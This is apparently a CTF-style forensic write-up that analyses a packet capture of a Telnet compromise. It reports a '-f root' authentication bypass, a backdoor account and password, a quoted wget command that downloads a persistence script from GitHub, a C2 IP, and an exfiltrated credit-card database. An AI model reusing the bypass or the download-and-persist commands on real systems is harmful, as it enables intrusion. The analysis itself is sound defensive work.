I opened the file `monitoringservice_export_202610AM-11AM.pcapng` with Wireshark I filtered the packages by `Telnet` protocol.
In the packet number 52, I found the `USER` environment variable being set with the value `-f root`. A quick search in Google revealed that the `CVE-2026-24061` is the CVE is associated with the vulnerability exploited in the Telnet protocol.

![](./assets/01%20-%20user%20-f%20root.png)

In the same package I found the time stamp when the Telnet vulnerability was  successfully exploited, granting the attacker remote root access on the target machine: `2026-01-27 10:39:28`

![](./assets/02%20-%20timestamp.png)

To identify the hostname of the targeted server, I followed the TCP stream and searched for the login banner typing `login` in the search box. That returned the kernel release/version and the hostname, which was `backup-secondary`.

![](./assets/03%20-%20hostname%20of%20targeted%20server.png)


Now, the attacker created a backdoor account to maintain future access. To find it I search with the word `useradd`, that returned the username and password setted for that account: `cleanupsvc:YouKnowWhoiam69`.

![](./assets/04%20-%20backdoor%20user%20password.png)

To find the full command the attacker used to download the persistence script, I tried with some variant until I the word `github` threw something interesting, the link `https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`. Scrolling up a little I found that the packets immediately before contain one character each forming `wget`. 

The full command used was `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`.

![](./assets/05%20-%20wget%20script.png)


Following the TCP Stream, I found the C2 IP address the attacker used to install remote access persistence using the persistence script: `91.99.25.54`.

![](./assets/06%20-%20c2%20ip%20address.png)

The attacker exfiltrated a sensitive database file, so in order to find out which one I searched with the word `GET` which threw this `GET /credit-cards-25-blackfriday.db`, obviusly a database efiltrated, with the timestamp `2026-01-27 10:49:54`.

![](./assets/07%20-%20exfiltrated%20db%20timestamp.png)

Now we need to analyze the exfiltrated database, and for compliance requirements, notify the customers of the breached organization. For data validation purposes, we need to find the credit card number for a customer named `Quinn Harris`.

I exported the database file using Wireshark 'Export Objects' feature and opened the database file in `DB Browser for SQLite`.

I browsed the data with the name `Quinn Harris` which returned the email fo the client `quinn.harris@hotmail.com`.

![](./assets/08%20-%20quinn%20harris%20email.png)

Using that email I did this query `SELECT * FROM purchases WHERE email = "quinn.harris@hotmail.com";` to the database wich returned the credit card number of Quinn Harris: `5312269047781209`.

![](./assets/09%20-%20credit%20card%20number%20found.png)

